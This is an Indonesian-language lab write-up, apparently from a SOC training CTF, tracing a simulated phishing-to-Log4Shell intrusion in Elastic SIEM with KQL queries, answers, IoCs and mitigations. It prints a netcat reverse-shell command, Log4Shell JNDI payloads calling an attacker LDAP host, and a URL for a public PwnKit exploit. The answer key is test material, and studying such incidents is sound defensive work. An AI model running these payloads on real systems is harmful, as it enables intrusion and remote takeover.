[README.md](https://github.com/user-attachments/files/27854033/README.md)
# 🔍 SOC Analyst – Cyber Threat Analysis
### Studi Kasus: Investigasi Insiden Siber Menggunakan Elastic SIEM

---

> **Platform:** Cyber Academy  
> **Tools:** Elastic SIEM (Kibana Security), ELK Stack  
> **Scope:** Phishing → Malware → Lateral Movement → Privilege Escalation → Reverse Shell  
> **CVE Terkait:** CVE-2021-44228 (Log4Shell) & CVE-2021-4034 (PwnKit)

---

## 📋 Daftar Isi

- [Latar Belakang Kasus](#latar-belakang-kasus)
- [Environment & Tools](#environment--tools)
- [Attack Chain Overview](#attack-chain-overview)
- [Investigasi Step-by-Step](#investigasi-step-by-step)
  - [Q1 – User yang Mengunduh Malware](#q1--user-yang-pertama-kali-mengunduh-malware)
  - [Q2 – Hostname Korban](#q2--hostname-komputer-korban)
  - [Q3 – Nama Malicious File](#q3--nama-malicious-file)
  - [Q4 – IP Address Attacker](#q4--ip-address-attacker)
  - [Q5 – User Privilege Tinggi](#q5--user-dengan-privilege-lebih-tinggi)
  - [Q6 – File DLL yang Diunggah](#q6--file-dll-yang-diunggah-attacker)
  - [Q7 – Parent Process cmd.exe](#q7--parent-process-dari-cmdexe-pid-10716)
  - [Q8 – Registry Path](#q8--windows-registry-path-yang-diakses)
  - [Q9 – File yang Diubah PowerShell](#q9--file-yang-diubah-powershell-pid-8836)
  - [Q10 – File .PS1 Pertama](#q10--file-ps1-pertama-yang-dibuat-powershell-pid-11676)
  - [Q11 – IP Host Segmen yang Sama](#q11--ip-host-pada-segmen-jaringan-yang-sama)
  - [Q12 – Username Brute Force](#q12--username-yang-digunakan-attacker-brute-force)
  - [Q13 – URL Exploit GitHub](#q13--url-exploit-yang-diunduh-via-wget)
  - [Q14 – Waktu Eksekusi Exploit Python](#q14--waktu-3-file-dibuat-oleh-exploit-python)
  - [Q15 – MD5 Hash pkexec](#q15--md5-hash-dari-process-pkexec)
  - [Q16 – Perintah Interactive Shell](#q16--perintah-interactive-shell-pid-3011)
  - [Q17 – Hostname Netcat Alert](#q17--hostname-dengan-alert-netcat-network-activity)
  - [Q18 – Username Netcat](#q18--username-yang-menjalankan-netcat)
  - [Q19 – Parent Process Netcat](#q19--parent-process-dari-netcat)
  - [Q20 – Perintah Reverse Shell](#q20--perintah-reverse-shell-lengkap)
  - [Q21 – CVE Log4Shell](#q21--cve-vulnerability-yang-dieksploitasi)
  - [Q22 – Path Log File Solr](#q22--full-path-log-file-solr)
  - [Q23 – Endpoint Rentan Log4J](#q23--endpoint-yang-rentan-pada-log4j)
  - [Q24 – Parameter GET Request](#q24--parameter-get-request-log4j-payload)
  - [Q25 – JNDI Payload](#q25--jndi-payload-ldap)
- [Ringkasan Temuan (IoC)](#ringkasan-temuan-ioc)
- [Rekomendasi Mitigasi](#rekomendasi-mitigasi)
- [Attack MITRE ATT&CK Mapping](#attack-mitre-attck-mapping)

---

## Latar Belakang Kasus

Perusahaan mengalami serangan siber yang diawali dengan **phishing email**. Beberapa karyawan berhasil ditipu untuk mengunduh dan menjalankan file berbahaya. Penyerang kemudian berhasil masuk ke sistem, melakukan **lateral movement**, **privilege escalation**, dan akhirnya mendapatkan **reverse shell** ke Web Server melalui eksploitasi **Log4Shell (CVE-2021-44228)**.

Sebagai **SOC Analyst**, tugas adalah melakukan investigasi menggunakan **Elastic SIEM** dan mendokumentasikan seluruh temuan untuk dilaporkan ke SOC Manager.

---

## Environment & Tools

| Komponen | Detail |
|---|---|
| SIEM Platform | Elastic / Kibana Security |
| Elastic URL | `http://192.168.58.2:5601` |
| CTF Platform | `http://192.168.58.2` |
| Username SIEM | `elastic` |
| Metode Akses | Virtual Machine (lab environment) |
| Index yang Digunakan | `log-*`, `filebeat-*` |

---

## Attack Chain Overview

```
[Phishing Email]
      │
      ▼
[User "ahmed" mengunduh Acount_details.pdf.exe via Microsoft Edge]
      │
      ▼
[Malware dijalankan → koneksi ke C2: 192.168.1.10:443]
      │
      ▼
[User "cybery" (privilege lebih tinggi) juga menjalankan malware]
      │
      ▼
[DLL Injection → rundll32.exe → cmd.exe (NT AUTHORITY)]
      │
      ▼
[Registry Modification: Disable FIPS Encryption Policy]
      │
      ▼
[Lateral Movement → pivot ke 192.168.10.30 (Ubuntu)]
      │
      ▼
[Brute Force SSH → login sebagai "salem"]
      │
      ▼
[Download exploit: CVE-2021-4034 (PwnKit) via wget dari GitHub]
      │
      ▼
[Privilege Escalation → root via pkexec]
      │
      ▼
[Eksploitasi Log4Shell (CVE-2021-44228) pada Apache Solr]
      │
      ▼
[Reverse Shell: nc -e /bin/bash 192.168.1.10 9999]
```

---

## Investigasi Step-by-Step

### Q1 – User yang Pertama Kali Mengunduh Malware

**Pertanyaan:** Siapa user yang pertama kali mengunduh malicious file yang terdeteksi sebagai malware?

**Langkah Investigasi:**
1. Buka menu **Security → Alerts**
2. Filter berdasarkan `signal.rule.name: Malware Detection Alert`
3. Urutkan berdasarkan timestamp (paling awal)
4. Perhatikan kolom `user.name` dan `file.name`

**Query KQL:**
```kql
signal.rule.name: "Malware Detection Alert"
```

**Temuan:**
- User **ahmed** mengunduh file `Acount_details.pdf.exe` pada `Feb 3, 2022 @ 01:08:25.884`
- Aplikasi yang digunakan: **msedge.exe** (Microsoft Edge)
- File ini menggunakan **double extension** (teknik social engineering untuk menyembunyikan ekstensi `.exe`)

**✅ Jawaban: `ahmed`**

---

### Q2 – Hostname Komputer Korban

**Pertanyaan:** Apa nama computer hostname yang digunakan oleh user tersebut?

**Langkah Investigasi:**
- Dari hasil filter yang sama pada Q1, lihat kolom `host.name`

**✅ Jawaban: `DESKTOP-Q1SL9P2`**

---

### Q3 – Nama Malicious File

**Pertanyaan:** Apa nama malicious file yang terdeteksi?

**Langkah Investigasi:**
- Dari hasil filter yang sama pada Q1, lihat kolom `file.name`
- Perhatikan teknik **double extension**: `.pdf.exe` — file ini menyamar sebagai dokumen PDF

**✅ Jawaban: `Acount_details.pdf.exe`**

---

### Q4 – IP Address Attacker

**Pertanyaan:** Sebutkan alamat IP yang diindikasikan sebagai IP aktor penyerang?

**Langkah Investigasi:**
1. Dari alert Malware Detection, klik **Analyze Event** pada baris terkait
2. Periksa koneksi jaringan (network events) dari proses `Acount_details.pdf.exe`
3. Temukan ada **11 network events** yang berkaitan
4. Lihat `destination.address` dan `destination.port`

**Temuan:**
- Destination IP: **192.168.1.10**
- Destination Port: **443** (HTTPS/encrypted C2 communication)
- Ini menandakan attacker menggunakan **Command & Control (C2)** melalui port 443 untuk menghindari deteksi firewall

**✅ Jawaban: `192.168.1.10`**

---

### Q5 – User dengan Privilege Lebih Tinggi

**Pertanyaan:** Malicious file juga dijalankan oleh user lain dengan privilege lebih tinggi. Siapakah user tersebut?

**Langkah Investigasi:**
1. Dari filter Malware Detection Alert yang sama
2. Tambahkan kolom: `user.name`, `host.name`, `file.name`
3. Cari user lain yang menjalankan `Acount_details.pdf.exe` di host yang sama

**Temuan:**
- User **cybery** juga menjalankan malware yang sama di `DESKTOP-Q1SL9P2`
- User ini memiliki privilege lebih tinggi dibanding `ahmed`

**✅ Jawaban: `cybery`**

---

### Q6 – File DLL yang Diunggah Attacker

**Pertanyaan:** Attacker mengunggah file .DLL berukuran 8704 bytes. Sebutkan nama file tersebut?

**Langkah Investigasi:**
1. Buka **Security → Alerts**
2. Gunakan query KQL:

```kql
file.size : 8704
```

3. Tambahkan kolom `file.name` untuk melihat nama file
4. Filter rule: **Malware Detection Alert**

**Temuan:**
- Ditemukan 2 alert dengan file berukuran 8704 bytes
- File DLL diunggah oleh attacker sebagai bagian dari **DLL injection** untuk persistence

**✅ Jawaban: `mCblHDgWP.dll`**

---

### Q7 – Parent Process dari cmd.exe PID 10716

**Pertanyaan:** Apa nama parent process yang menjalankan cmd.exe dengan PID 10716 menggunakan hak akses NT AUTHORITY?

**Langkah Investigasi:**
1. Buka **Analytics → Discover**
2. Query KQL:

```kql
process.pid: 10716
```

3. Tampilkan kolom: `event.action`, `host.name`, `process.command_line`, `process.parent.name`, `process.pid`, `user.domain`
4. Cari baris dengan `user.domain: NT AUTHORITY`

**Temuan:**
- `cmd.exe` (PID 10716) dijalankan dengan **NT AUTHORITY/SYSTEM** privileges
- Parent process: **rundll32.exe** (PID 8856)
- Ini menandakan attacker menggunakan **rundll32.exe** untuk menjalankan DLL berbahaya yang kemudian spawn `cmd.exe`

**✅ Jawaban: `rundll32.exe`**

---

### Q8 – Windows Registry Path yang Diakses

**Pertanyaan:** Process pada Q7 juga melakukan akses ke Windows Registry. Sebutkan path lengkap registry yang diakses?

**Langkah Investigasi:**
1. Dari temuan Q7, gunakan **Security → Alerts** dengan query:

```kql
process.pid: 10716
```

2. Tampilkan kolom `process.parent.pid`, konfirmasi parent PID = **8856**
3. Buka **Analyze Event** untuk process `rundll32.exe` PID 8856
4. Lihat bagian **registry events**

**Temuan:**
- Attacker memodifikasi registry untuk **menonaktifkan standar enkripsi FIPS 140** (NIST Standard)
- Tujuan: melemahkan keamanan enkripsi sistem agar komunikasi C2 tidak terblokir
- Registry ini secara default di-disable Windows untuk memastikan selalu menggunakan enkripsi FIPS tervalidasi

**✅ Jawaban:**
```
HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled
```

---

### Q9 – File yang Diubah PowerShell PID 8836

**Pertanyaan:** Program PowerShell dengan PID 8836 terdeteksi melakukan perubahan terhadap sebuah file. Apa nama file tersebut?

**Langkah Investigasi:**
1. Buka **Analytics → Discover**
2. Query KQL:

```kql
process.name: powershell.exe and process.pid: 8836
```

3. Tampilkan kolom `event.action`
4. Cari baris dengan `event.action: overwrite`
5. Buka detail event → lihat `file.name`

**Temuan:**
- PowerShell melakukan **overwrite** pada file cache modul
- File ini berisi cache analisis modul PowerShell yang di-overwrite untuk menghindari deteksi

**✅ Jawaban: `ModuleAnalysisCache`**

---

### Q10 – File .PS1 Pertama yang Dibuat PowerShell PID 11676

**Pertanyaan:** PowerShell dengan PID 11676 membuat file baru dengan ekstensi .PS1. Apa nama file pertama yang dibuat?

**Langkah Investigasi:**
1. Buka **Analytics → Discover**
2. Query KQL:

```kql
process.name: powershell.exe and process.pid: 11676 and event.action: "File created (rule: FileCreate)"
```

3. Tampilkan kolom `file.name`
4. Urutkan berdasarkan **timestamp ascending** untuk melihat file pertama

**✅ Jawaban: `__PSScriptPolicyTest_bymwxuft.3b5.ps1`**

---

### Q11 – IP Host pada Segmen Jaringan yang Sama

**Pertanyaan:** Sebutkan alamat IP komputer host yang berada pada segmen jaringan yang sama dengan komputer korban pertama.

**Langkah Investigasi:**
1. Dari analisis sebelumnya, IP korban pertama diketahui: **192.168.10.10**
2. Subnet kelas C: `192.168.10.0/24`
3. Buka **Analytics → Discover**, query KQL:

```kql
host.ip: 192.168.10.0/24 and NOT host.ip: 192.168.10.10
```

**Temuan:**
- Terdapat host lain di subnet yang sama
- Host ini menjadi target **lateral movement** attacker

**✅ Jawaban: `192.168.10.30`**

---

### Q12 – Username yang Digunakan Attacker (Brute Force)

**Pertanyaan:** Attacker berhasil login ke Ubuntu (192.168.10.30) setelah brute force. Apa username yang digunakan?

**Langkah Investigasi:**
1. Buka **Security → Hosts → Authentications**
2. Identifikasi lonjakan **login failure** dalam waktu singkat (indikasi brute force)
3. Fokus pada rentang waktu tersebut
4. Gunakan query untuk login yang berhasil:

```kql
system.auth.ssh.event: Accepted
```

5. Lihat kolom `user.name` pada login yang sukses

**Temuan:**
- Ratusan login failure dari berbagai username (admin, password, P@$$W0rd, dll.)
- Hanya **1 username** yang berhasil login
- Attacker menggunakan **SSH (port 22)** untuk remote login

**✅ Jawaban: `salem`**

---

### Q13 – URL Exploit yang Diunduh via wget

**Pertanyaan:** Attacker mengunduh file exploit dari GitHub menggunakan wget. Apa URL repositorinya?

**Langkah Investigasi:**
1. Buka **Analytics → Discover**
2. Query KQL:

```kql
user.name: salem and process.args: wget
```

3. Buka detail event pertama dimana `wget` dieksekusi
4. Lihat kolom `process.command_line`

**Temuan:**
- Exploit yang diunduh: **CVE-2021-4034** (PwnKit — Local Privilege Escalation pada polkit/pkexec)
- Ini adalah kerentanan yang memungkinkan user biasa menjadi **root**

**✅ Jawaban:**
```
https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

---

### Q14 – Waktu 3 File Dibuat oleh Exploit Python

**Pertanyaan:** Attacker menjalankan exploit Python pada 3 Februari 2022 yang membuat 3 file baru secara simultan. Kapan waktu pembuatannya?

**Langkah Investigasi:**
1. Query KQL di **Analytics → Discover**:

```kql
user.name: "salem" and process.args: "python3"
```

2. Lihat kolom `event.action`, filter yang bernilai `creation`
3. Ditemukan 3 event pembuatan file secara bersamaan
4. Validasi melalui **Security → Hosts → Events** dengan query yang sama
5. Buka **Analyze Event** untuk python3 dan lihat **3 file events**

**File yang dibuat:**
| File | Keterangan |
|---|---|
| `payload.so` | Shared library untuk exploit |
| `exploit` | Binary exploit |
| `gconv-modules` | Library hijack untuk privilege escalation |

**✅ Jawaban: `00:45:06`**

---

### Q15 – MD5 Hash dari Process pkexec

**Pertanyaan:** Exploit menjalankan process baru 'pkexec' (privilege escalation). Sebutkan nilai MD5 hash-nya.

**Langkah Investigasi:**
1. Dari hasil analisis Q14, buka detail **child process** dengan nama `pkexec`
2. Lihat `process.hash.md5`

**Konteks:**
- `pkexec` adalah bagian dari **polkit** di Linux
- CVE-2021-4034 mengeksploitasi memory corruption pada pkexec untuk mendapatkan akses **root**

**✅ Jawaban: `3a4ad518e9e404a6bad3d39dfebaf2f6`**

---

### Q16 – Perintah Interactive Shell PID 3011

**Pertanyaan:** Attacker mendapatkan akses interactive shell dengan PID 3011. Perintah apa yang dijalankan?

**Langkah Investigasi:**
1. Query KQL:

```kql
process.pid: 3011
```

2. Korelasikan waktu kejadian dengan event sebelumnya
3. Aktifkan kolom `process.command_line`

**Temuan:**
- Attacker menggunakan **bash interactive mode** setelah privilege escalation
- Flag `-i` menunjukkan **interactive shell** yang memungkinkan attacker berinteraksi langsung dengan sistem

**✅ Jawaban: `bash -i`**

---

### Q17 – Hostname dengan Alert Netcat Network Activity

**Pertanyaan:** Sebutkan nama hostname komputer yang memunculkan peringatan 'Netcat Network Activity'.

**Langkah Investigasi:**
1. Buka **Security → Alerts**
2. Filter: `signal.rule.name: "Netcat Network Activity"`
3. Lihat kolom `host.name` pada event yang muncul

**✅ Jawaban: `CentOS`**

---

### Q18 – Username yang Menjalankan Netcat

**Pertanyaan:** Siapa username yang menjalankan program 'netcat'?

**Langkah Investigasi:**
- Dari event log yang sama pada Q17, lihat kolom `user.name`

**✅ Jawaban: `solr`**

---

### Q19 – Parent Process dari Netcat

**Pertanyaan:** Apa nama parent process yang menjalankan program 'netcat'?

**Langkah Investigasi:**
1. Dari event log Netcat Network Activity, klik **Analyze Event**
2. Lihat process tree untuk melihat parent process dari `nc`

**Temuan:**
- `nc` dijalankan oleh **java** — ini mengonfirmasi eksploitasi via **Apache Solr** (Java-based)
- Attack vector: Java application → spawn netcat → reverse shell

**✅ Jawaban: `java`**

---

### Q20 – Perintah Reverse Shell Lengkap

**Pertanyaan:** Sebutkan perintah lengkap yang dijalankan attacker untuk mendapatkan reverse shell ke Web Server.

**Langkah Investigasi:**
1. Buka **Analytics → Discover**
2. Query KQL:

```kql
process.name: nc
```

3. Tampilkan kolom `process.command_line`

**Analisis:**
- `-e /bin/bash` → redirect stdin/stdout bash ke koneksi netcat (classic reverse shell)
- `192.168.1.10` → IP attacker (C2 server)
- `9999` → port listener di sisi attacker

**✅ Jawaban: `nc -e /bin/bash 192.168.1.10 9999`**

---

### Q21 – CVE Vulnerability yang Dieksploitasi

**Pertanyaan:** Apa nama kode kerentanan CVE yang dieksploitasi pada aplikasi logging Java?

**Penjelasan:**

Kerentanan yang dieksploitasi adalah **Log4Shell** pada **Apache Log4j**.

| Detail | Informasi |
|---|---|
| CVE | **CVE-2021-44228** |
| Nama | Log4Shell |
| Komponen | Apache Log4j 2.x |
| Versi Terdampak | 2.0 – 2.14.1 |
| CVSS Score | **10.0 (CRITICAL)** |
| Tipe | Remote Code Execution (RCE) |
| Dampak | Attacker dapat mengambil alih penuh server |

**Cara kerja:**
- Attacker mengirimkan string `${jndi:ldap://attacker.com/exploit}` pada field yang di-log oleh Log4j
- Log4j memproses string JNDI dan membuat koneksi ke LDAP server attacker
- Server attacker mengembalikan malicious Java class yang dieksekusi oleh server korban

**✅ Jawaban: `CVE-2021-44228`**

---

### Q22 – Full Path Log File Solr

**Pertanyaan:** Sebutkan alamat lengkap (full path) dari file log aplikasi 'solr'.

**Langkah Investigasi:**
1. Buka **Analytics → Discover**
2. Ganti index ke **filebeat-***
3. Query KQL:

```kql
file.path: *solr*
```

4. Tampilkan kolom `log.file.path`
5. Korelasikan dengan temuan sebelumnya (host CentOS)

**✅ Jawaban: `/var/solr/logs/solr.log`**

---

### Q23 – Endpoint yang Rentan pada Log4J

**Pertanyaan:** Sebutkan alamat lengkap (full path) yang rentan terhadap serangan Log4J.

**Langkah Investigasi:**
1. Periksa konten `message` pada log `/var/solr/logs/solr.log`
2. Temukan HTTP request yang mengandung payload JNDI
3. Lihat path yang di-request

**✅ Jawaban: `/admin/cores`**

---

### Q24 – Parameter GET Request Log4J Payload

**Pertanyaan:** Sebutkan parameter GET request yang digunakan attacker dalam mengirimkan Log4J payload.

**Langkah Investigasi:**
- Dari log message yang sama pada Q23, analisis query string pada HTTP request

**✅ Jawaban: `foo`**

---

### Q25 – JNDI Payload LDAP

**Pertanyaan:** Sebutkan JNDI payload yang digunakan attacker untuk menghubungkan perangkat ke LDAP server attacker.

**Analisis Payload:**

```
{foo=${jndi:ldap://192.168.1.10:1389/Exploit}}
```

| Komponen | Keterangan |
|---|---|
| `foo` | Parameter GET yang rentan |
| `${jndi:...}` | JNDI lookup expression yang diproses Log4j |
| `ldap://` | Protocol LDAP untuk lookup |
| `192.168.1.10` | IP attacker (LDAP server) |
| `1389` | Port LDAP server attacker |
| `/Exploit` | Path malicious Java class |

**✅ Jawaban: `{foo=${jndi:ldap://192.168.1.10:1389/Exploit}}`**

---

## Ringkasan Temuan (IoC)

### Indicators of Compromise (IoC)

| Kategori | Nilai | Keterangan |
|---|---|---|
| **Malicious File** | `Acount_details.pdf.exe` | Malware dengan double extension |
| **Attacker C2 IP** | `192.168.1.10` | Command & Control server |
| **C2 Port** | `443`, `9999`, `1389` | Port yang digunakan attacker |
| **Compromised Users** | `ahmed`, `cybery`, `salem`, `solr` | Akun yang terlibat |
| **Compromised Hosts** | `DESKTOP-Q1SL9P2`, `192.168.10.30 (Ubuntu)`, `CentOS` | Host yang dikompromis |
| **Malicious DLL** | `mCblHDgWP.dll` | DLL yang diinjeksikan |
| **Exploit** | `CVE-2021-4034.py` | PwnKit privilege escalation |
| **CVE** | `CVE-2021-44228`, `CVE-2021-4034` | Kerentanan yang dieksploitasi |
| **Registry Modification** | `HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled` | Menonaktifkan FIPS |
| **Reverse Shell Command** | `nc -e /bin/bash 192.168.1.10 9999` | Payload reverse shell |
| **JNDI Payload** | `${jndi:ldap://192.168.1.10:1389/Exploit}` | Log4Shell payload |
| **Vulnerable Endpoint** | `/admin/cores` | Apache Solr admin endpoint |
| **Log File** | `/var/solr/logs/solr.log` | Log Apache Solr |

---

## Rekomendasi Mitigasi

### Immediate Response (0–24 jam)
- [ ] Isolasi host yang terkompromi dari jaringan
- [ ] Reset credentials semua akun yang terlibat
- [ ] Block IP attacker `192.168.1.10` di firewall
- [ ] Kill semua proses berbahaya yang masih berjalan

### Short-term (1–7 hari)
- [ ] **Patch Log4j** ke versi ≥ 2.15.0 atau upgrade ke versi terbaru
- [ ] **Patch polkit/pkexec** untuk menutup CVE-2021-4034
- [ ] Aktifkan kembali **FIPS 140 Standard** di registry
- [ ] Audit seluruh akun dengan privilege tinggi
- [ ] Implementasi **Email Security Gateway** untuk blokir phishing

### Long-term (1–4 minggu)
- [ ] Deploy **EDR (Endpoint Detection & Response)** di semua host
- [ ] Implementasi **Network Segmentation** untuk batasi lateral movement
- [ ] Aktifkan **MFA (Multi-Factor Authentication)** untuk SSH
- [ ] Terapkan **Principle of Least Privilege** pada semua akun
- [ ] Lakukan **Security Awareness Training** untuk karyawan
- [ ] Review dan perketat **SIEM alert rules**

---

## Attack MITRE ATT&CK Mapping

| Tactic | Technique | ID | Detail |
|---|---|---|---|
| Initial Access | Phishing | T1566 | Email phishing dengan malicious attachment |
| Execution | User Execution | T1204 | User menjalankan `Acount_details.pdf.exe` |
| Defense Evasion | Masquerading | T1036 | Double extension `.pdf.exe` |
| Command & Control | Application Layer Protocol | T1071 | C2 via port 443 |
| Persistence | DLL Side-Loading | T1574.002 | `mCblHDgWP.dll` injection via rundll32 |
| Defense Evasion | Modify Registry | T1112 | Disable FIPS encryption policy |
| Lateral Movement | Remote Services: SSH | T1021.004 | Brute force SSH ke Ubuntu |
| Credential Access | Brute Force | T1110 | SSH brute force terhadap 192.168.10.30 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | CVE-2021-4034 (PwnKit) |
| Initial Access (Web) | Exploit Public-Facing Application | T1190 | Log4Shell CVE-2021-44228 pada Apache Solr |
| Execution | Command & Scripting Interpreter: Unix Shell | T1059.004 | `bash -i`, `nc -e /bin/bash` |
| Command & Control | Non-Standard Port | T1571 | Reverse shell port 9999 |

---

## 📁 Struktur Repository

```
soc-analyst-case-study/
├── README.md                    ← Dokumentasi utama (file ini)
├── ioc/
│   └── indicators.md            ← Daftar IoC lengkap
└── screenshots/                 ← Screenshot investigasi (opsional)
```

---

*Dokumentasi ini dibuat sebagai bagian dari latihan SOC Analyst pada environment lab yang terkontrol.*  
*Semua IP, username, dan file yang disebutkan merupakan bagian dari simulasi dan tidak merepresentasikan sistem nyata.*

---

**Author:** Fahmi Riansyah  
**GitHub:** [github.com/fahmipentest](https://github.com/fahmipentest)  
**Certifications:** CEH | CRTOM | CCSE | Certified Web Red Team Analyst
